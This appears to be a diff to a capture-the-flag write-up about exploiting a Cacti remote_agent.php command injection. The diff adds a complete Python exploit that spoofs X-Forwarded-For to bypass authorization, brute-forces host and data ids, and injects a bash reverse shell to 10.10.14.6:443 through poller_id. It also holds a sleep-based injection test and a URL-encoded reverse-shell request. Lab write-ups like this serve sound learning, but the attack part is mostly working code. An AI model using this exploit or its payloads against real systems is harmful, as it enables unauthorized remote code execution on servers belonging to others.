@@ -63,7 +63,49 @@ GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=1
 poller_id=1;sleep 5
 ```
 
-The response went from ~255ms to ~5.2s, so the command ran. Then the reverse shell on `poller_id`, URL-encoded:
+The response went from ~255ms to ~5.2s, so the command ran.
+
+Once I knew the box only answered to `uptime`, I rewrote the brute force as a small script so the whole thing was one command. It is the same logic the public PoCs use, except the `rrd_name` allowlist includes `uptime`, which is the only change that mattered here. It walks `host_id` 1-4 and `local_data_ids[]` 1-9 with `X-Forwarded-For: 127.0.0.1`, stops on the first id pair whose `rrd_name` is `polling_time` or `uptime`, then fires the reverse shell on `poller_id`:
+
+```python
+import requests
+import urllib.parse
+
+def checkVuln():
+    result = requests.get(vulnURL, headers=header)
+    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)
+
+def bruteForce():
+    for i in range(1, 5):
+        for j in range(1, 10):
+            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
+            result = requests.get(vulnIdURL, headers=header)
+            if result.text != "[]":
+                rrdName = result.json()[0]["rrd_name"]
+                if rrdName == "polling_time" or rrdName == "uptime":
+                    return True, i, j
+    return False, -1, -1
+
+def remoteCodeExecution(payload, idHost, idLocal):
+    encodedPayload = urllib.parse.quote(payload)
+    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
+    result = requests.get(injectedURL, headers=header)
+    print(result.text)
+
+if __name__ == "__main__":
+    targetURL = "http://10.129.51.52/"
+    vulnURL = f"{targetURL}/remote_agent.php"
+    header = {"X-Forwarded-For": "127.0.0.1"}
+    if checkVuln():
+        isVuln, idHost, idLocal = bruteForce()
+        ipAddress = "10.10.14.6"
+        port = "443"
+        payload = f"bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1'"
+        if isVuln:
+            remoteCodeExecution(payload, idHost, idLocal)
+```
+
+The manual request that the script reduces to, the reverse shell on `poller_id` URL-encoded:
 
 ```
 poller_id=1;bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261
